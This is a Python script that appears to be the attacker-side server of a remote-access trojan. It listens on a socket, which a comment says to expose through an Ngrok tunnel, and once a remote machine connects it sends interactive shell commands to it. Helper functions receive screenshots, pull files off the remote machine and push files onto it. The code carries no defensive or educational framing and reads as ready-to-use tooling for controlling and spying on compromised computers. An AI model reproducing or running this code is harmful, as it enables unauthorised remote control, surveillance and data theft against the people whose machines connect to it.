import socket
import subprocess
import os

def start_listener(host, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((host, port))
    listener.listen(1)
    print(f"🔊 [*] Listening on {host}:{port}")

    client_socket, addr = listener.accept()
    print(f"🤝 [*] Received connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("💻 Shell> ")

        if command.lower() == "exit":
            break
        client_socket.send(command.encode())
        response = client_socket.recv(4096).decode()
        print(response)

    client_socket.close()
    listener.close()

def receive_screenshot(client_socket):
    screenshot_data = b""
    while True:
        data = client_socket.recv(4096)
        if data == b"DONE":
            break
        screenshot_data += data

    with open("screenshot.jpg", "wb") as file:
        file.write(screenshot_data)

    print("[*] 🖼️ Screenshot received and saved as 'screenshot.jpg'")

def upload_files(client_socket):
    file_count = int(client_socket.recv(4096).decode())
    print(f"[*] Uploading {file_count} file(s)")

    for _ in range(file_count):
        file_path = client_socket.recv(4096).decode()
        if os.path.isfile(file_path):
            file_name = os.path.basename(file_path)
            client_socket.send(file_name.encode())

            with open(file_path, "rb") as file:
                data = file.read(4096)
                while data:
                    client_socket.send(data)
                    data = file.read(4096)

            client_socket.send(b"DONE")
            print(f"[*] File '{file_name}' uploaded successfully")
        else:
            print(f"[!] File '{file_path}' does not exist")

def download_file(client_socket):
    file_name = client_socket.recv(4096).decode()

    if file_name == "FILE_NOT_FOUND":
        print("[!] File not found on the remote machine")
        return

    with open(file_name, "wb") as file:
        while True:
            data = client_socket.recv(4096)
            if data == b"DONE":
                break
            file.write(data)

    print(f"[*] 📥 File '{file_name}' downloaded successfully")

if __name__ == "__main__":
    host = "host"  # Replace with your Ngrok tunnel URL
    port = 1234  # Choose a port number
    start_listener(host, port)
